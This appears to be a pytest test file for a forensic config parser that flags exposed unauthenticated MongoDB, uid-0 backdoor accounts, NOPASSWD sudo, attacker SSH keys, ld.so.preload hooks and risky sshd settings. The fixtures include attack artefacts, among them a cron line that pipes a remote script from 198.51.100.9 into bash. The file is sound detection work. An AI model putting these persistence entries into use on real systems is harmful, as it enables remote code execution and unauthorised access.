"""Tests for the Linux config parser and the evidence/noise split.

The parser exists because a real case was answered entirely from a file the tool never
opened. MongoDB accepted unauthenticated connections from every interface, and both
halves of that were two lines of ``/etc/mongod.conf`` — one of them commented out.

The noise split exists because the same collection had ~3,000 ``/etc`` files turned
into one-event rows. The danger in fixing that is obvious and is asserted here first:
an exclusion list that swallows ``sudoers`` or ``cron.d`` would hide persistence.
"""
from __future__ import annotations

from pathlib import Path

import pytest

from inspecthor.evidence import is_collector_noise, is_evidence_config
from inspecthor.models import LEVEL_RANK, ParseContext
from inspecthor.parsers.plugins.linux_config import (
    LinuxConfigParser, read_indented_config,
)

# Verbatim from the real collection — the file that held the answer.
MONGOD_CONF = """\
# mongod.conf
storage:
  dbPath: /var/lib/mongodb
systemLog:
  destination: file
  logAppend: true
  path: /var/log/mongodb/mongod.log
net:
  port: 27017
  bindIp: 0.0.0.0
#security:
processManagement:
  timeZoneInfo: /usr/share/zoneinfo
"""


def _parse(tmp_path: Path, name: str, content: str, subdir: str = ""):
    target = tmp_path / subdir if subdir else tmp_path
    target.mkdir(parents=True, exist_ok=True)
    path = target / name
    path.write_text(content, encoding="utf-8")
    ctx = ParseContext(evidence_root=tmp_path)
    return list(LinuxConfigParser().parse(path, ctx)), ctx


def _worst(events) -> str:
    return max((e.severity for e in events), key=lambda s: LEVEL_RANK[s], default="info")


# ---- the noise split must not eat evidence ------------------------------------


@pytest.mark.parametrize("path", [
    "/ev/[root]/etc/sudoers",
    "/ev/[root]/etc/sudoers.d/90-cloud-init-users",
    "/ev/[root]/etc/cron.d/mysuspiciousjob",
    "/ev/[root]/etc/cron.daily/backup",
    "/ev/[root]/etc/ssh/sshd_config",
    "/ev/[root]/root/.ssh/authorized_keys",
    "/ev/[root]/home/mongoadmin/.ssh/authorized_keys",
    "/ev/[root]/etc/passwd",
    "/ev/[root]/etc/shadow",
    "/ev/[root]/etc/mongod.conf",
    "/ev/[root]/etc/ld.so.preload",
    "/ev/[root]/home/mongoadmin/.bash_history",
])
def test_real_evidence_is_never_classified_as_noise(path):
    """The first version of this list called /etc/cron.d/ noise, which would have
    hidden a cron persistence entry."""
    assert is_evidence_config(path), path
    assert not is_collector_noise(path), path


@pytest.mark.parametrize("path", [
    "/ev/[root]/etc/apparmor.d/abstractions/base",
    "/ev/[root]/etc/apparmor.d/abi/3.0",
    "/ev/[root]/etc/alternatives/README",
    "/ev/[root]/etc/alternatives/vi.ru.1.gz",
    "/ev/[root]/etc/ssl/certs/653b494a.0",
    "/ev/[root]/etc/rc2.d/S01cron",
    "/ev/[root]/usr/lib/systemd/system/mongod.service",
    "/ev/[root]/etc/vmware-tools/vgauth/schemas/XMLSchema.xsd",
    "/ev/[root]/etc/console-setup/Uni2-Fixed16.psf.gz",
    "/ev/[root]/etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg",
])
def test_collector_sweepings_are_noise(path):
    assert is_collector_noise(path), path


def test_generic_text_declines_collector_noise(tmp_path: Path):
    from inspecthor.parsers.plugins.generic_text import GenericText

    noisy = tmp_path / "etc" / "apparmor.d" / "abstractions"
    noisy.mkdir(parents=True)
    path = noisy / "base"
    path.write_text("# abstraction\n  /usr/lib/** mr,\n", encoding="utf-8")
    assert GenericText().sniff(path, path.read_bytes(), "text") == 0.0


# ---- comments are the finding -------------------------------------------------


def test_commented_keys_are_recorded_separately():
    """'#security:' and an absent 'security:' look identical to a config reader, and
    both mean unauthenticated — but only one tells you it was deliberate."""
    settings, commented = read_indented_config(MONGOD_CONF.splitlines())
    assert settings["net.bindIp"] == "0.0.0.0"
    assert settings["net.port"] == "27017"
    assert "security" in commented
    assert "security.authorization" not in settings


def test_indented_paths_are_dotted():
    settings, _ = read_indented_config(MONGOD_CONF.splitlines())
    assert settings["storage.dbPath"] == "/var/lib/mongodb"
    assert settings["systemLog.path"] == "/var/log/mongodb/mongod.log"


# ---- the case this was written for -------------------------------------------


def test_the_mangobleed_config_is_critical(tmp_path: Path):
    """The whole answer to a real Sherlock, from two lines of config."""
    events, _ = _parse(tmp_path, "mongod.conf", MONGOD_CONF)
    assert events
    top = events[0]
    assert top.severity == "crit", [(e.severity, e.title) for e in events]
    assert "every interface" in top.title
    assert "NO authentication" in top.title
    assert "0.0.0.0" in top.details
    assert "commented out" in top.details
    assert "T1190" in top.attck
    assert top.data["why"]


def test_localhost_bound_without_auth_is_lower(tmp_path: Path):
    """Same missing auth, not reachable. Severity has to reflect exposure."""
    conf = MONGOD_CONF.replace("bindIp: 0.0.0.0", "bindIp: 127.0.0.1")
    events, _ = _parse(tmp_path, "mongod.conf", conf)
    assert _worst(events) == "high"


def test_authenticated_and_exposed_is_medium(tmp_path: Path):
    conf = MONGOD_CONF.replace("#security:", "security:\n  authorization: enabled")
    events, _ = _parse(tmp_path, "mongod.conf", conf)
    assert _worst(events) == "med"


def test_authenticated_and_local_is_not_a_finding(tmp_path: Path):
    conf = (MONGOD_CONF
            .replace("bindIp: 0.0.0.0", "bindIp: 127.0.0.1")
            .replace("#security:", "security:\n  authorization: enabled"))
    events, _ = _parse(tmp_path, "mongod.conf", conf)
    assert LEVEL_RANK[_worst(events)] <= LEVEL_RANK["low"]
    assert events, "a clean file must still appear, or checked and missing look alike"


# ---- accounts ----------------------------------------------------------------


def test_second_uid_zero_account_is_critical(tmp_path: Path):
    passwd = (
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "backdoor:x:0:0::/home/backdoor:/bin/bash\n"
        "mongodb:x:111:65534::/nonexistent:/usr/sbin/nologin\n"
    )
    events, _ = _parse(tmp_path, "passwd", passwd)
    crit = [e for e in events if e.severity == "crit"]
    assert len(crit) == 1
    assert "backdoor" in crit[0].title
    assert "T1136.001" in crit[0].attck


def test_the_real_mongodb_service_account_is_not_flagged(tmp_path: Path):
    """uid 111 with nologin is exactly what the package creates."""
    events, _ = _parse(
        tmp_path, "passwd",
        "mongodb:x:111:65534::/nonexistent:/usr/sbin/nologin\n",
    )
    assert LEVEL_RANK[_worst(events)] <= LEVEL_RANK["low"]


def test_service_account_with_a_shell_is_flagged(tmp_path: Path):
    events, _ = _parse(tmp_path, "passwd",
                       "mongodb:x:111:65534::/var/lib/mongodb:/bin/bash\n")
    assert _worst(events) == "med"


def test_empty_password_field_is_critical(tmp_path: Path):
    shadow = (
        "root:$6$abc$def:19000:0:99999:7:::\n"
        "svc::19000:0:99999:7:::\n"
        "locked:!:19000:0:99999:7:::\n"
    )
    events, _ = _parse(tmp_path, "shadow", shadow)
    crit = [e for e in events if e.severity == "crit"]
    assert len(crit) == 1 and "svc" in crit[0].title


def test_locked_accounts_are_not_findings(tmp_path: Path):
    events, _ = _parse(tmp_path, "shadow", "root:!:19000:0:99999:7:::\n")
    assert not [e for e in events if e.severity in ("crit", "high")]


# ---- persistence -------------------------------------------------------------


def test_nopasswd_sudo_is_flagged(tmp_path: Path):
    events, _ = _parse(tmp_path, "sudoers",
                       "Defaults env_reset\nbackdoor ALL=(ALL) NOPASSWD: ALL\n")
    assert _worst(events) == "high"
    assert "T1548.003" in events[0].attck


def test_ssh_authorized_key_in_root_home_is_high(tmp_path: Path):
    events, _ = _parse(
        tmp_path, "authorized_keys",
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQxxxxxxxxxxxxxxxx attacker@vps\n",
        subdir="root/.ssh",
    )
    assert events and events[0].severity == "high"
    assert "root" in events[0].details
    assert "T1098.004" in events[0].attck


def test_cron_job_fetching_remote_content_is_high(tmp_path: Path):
    cron = (
        "17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n"
        "*/5 * * * * root curl -s http://198.51.100.9/x.sh | bash\n"
    )
    events, _ = _parse(tmp_path, "crontab", cron)
    high = [e for e in events if e.severity == "high"]
    assert len(high) == 1
    assert "curl" in high[0].data["why"]
    assert "T1105" in high[0].attck


def test_ld_so_preload_populated_is_critical(tmp_path: Path):
    events, _ = _parse(tmp_path, "ld.so.preload", "/usr/lib/libprocesshider.so\n")
    assert events and events[0].severity == "crit"
    assert "T1574.006" in events[0].attck


def test_empty_ld_so_preload_is_silent(tmp_path: Path):
    events, _ = _parse(tmp_path, "ld.so.preload", "# nothing here\n")
    assert all(e.severity == "info" for e in events)


# ---- sshd --------------------------------------------------------------------


def test_root_login_with_passwords_is_critical(tmp_path: Path):
    conf = "PermitRootLogin yes\nPasswordAuthentication yes\nPort 22\n"
    events, _ = _parse(tmp_path, "sshd_config", conf)
    assert _worst(events) == "crit"
    assert any("root is remotely reachable" in (e.data.get("why") or "")
               for e in events)


def test_hardened_sshd_is_not_a_finding(tmp_path: Path):
    conf = "PermitRootLogin no\nPasswordAuthentication no\nPort 22\n"
    events, _ = _parse(tmp_path, "sshd_config", conf)
    assert LEVEL_RANK[_worst(events)] <= LEVEL_RANK["low"]


# ---- guarantees that apply to every parser -----------------------------------


@pytest.mark.parametrize("name,content", [
    ("mongod.conf", MONGOD_CONF),
    ("passwd", "root:x:0:0:root:/root:/bin/bash\n"),
    ("shadow", "root:!:19000:0:99999:7:::\n"),
    ("sshd_config", "Port 22\n"),
    ("sudoers", "Defaults env_reset\n"),
    ("ld.so.preload", "\n"),
])
def test_every_event_has_a_title_and_details(tmp_path: Path, name, content):
    events, _ = _parse(tmp_path, name, content)
    for event in events:
        assert event.title.strip(), (name, event)
        assert event.details.strip(), (name, event)


def test_config_parser_beats_generic_text_in_selection(tmp_path: Path):
    from inspecthor.engine import sniff
    from inspecthor.parsers._loader import select_parser

    path = tmp_path / "mongod.conf"
    path.write_text(MONGOD_CONF, encoding="utf-8")
    chosen, _unavailable = select_parser(path, path.read_bytes()[:512], sniff(path).kind)
    assert chosen is not None and chosen.name == "linux_config", chosen
